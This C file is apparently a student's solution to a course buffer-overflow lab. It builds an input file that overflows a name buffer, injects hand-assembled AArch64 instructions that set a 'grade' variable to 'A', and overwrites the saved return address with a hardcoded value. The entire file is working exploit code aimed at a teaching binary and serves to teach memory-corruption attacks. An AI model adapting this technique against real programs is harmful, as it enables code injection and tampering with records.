/*--------------------------------------------------------------------*/
/* Produces a file called dataA with the student name, a nullbyte,    */
/* padding, assembly instructions somewhere else in memory to         */
/* overwrite grade, and padding of null bytes. It then jumps back to  */
/* main to finish the print f statemets.                              */
/*                                                                    */
/* Authors: Maxwell Lloyd and Venus Dinari                            */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include "miniassembler.h"

int main(void){
   FILE *psFile;
   unsigned long ulData;
   unsigned int ulInstruction;
   unsigned long pAAttack;
   int i;

   psFile = fopen("dataA", "w");

   /* Writes the new x30 for getName to skip to our assembly */
   pAAttack = 0x420058;

   /* Changes to be pointing to mov instead of name */
   pAAttack = pAAttack + 8;
   
   /* Writes the student's names */
   ulData = 0x00006E655678614D;
   fwrite(&ulData, sizeof(unsigned long), 1, psFile);

   /* mov x0, 'A'   */
   ulInstruction = MiniAssembler_mov(0, 65);
   fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);

   /* adr x1, grade */
   ulInstruction = MiniAssembler_adr(1, 0x420044, pAAttack + 4);
   fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);

   /* strb wo, [x1] */
   ulInstruction = MiniAssembler_strb(0, 1);
   fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);

   /* b  printf     */
   ulInstruction = MiniAssembler_b(0x40089c, pAAttack + 12);
   fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);


   /* Writes the null byte at the end of the instructions */
   for (i = 0; i < 24; i++)
      putc(0x00, psFile); /* Writes '00000000' */

   
   fwrite(&pAAttack, sizeof(unsigned long), 1, psFile);

   fclose(psFile);

   return 0;
}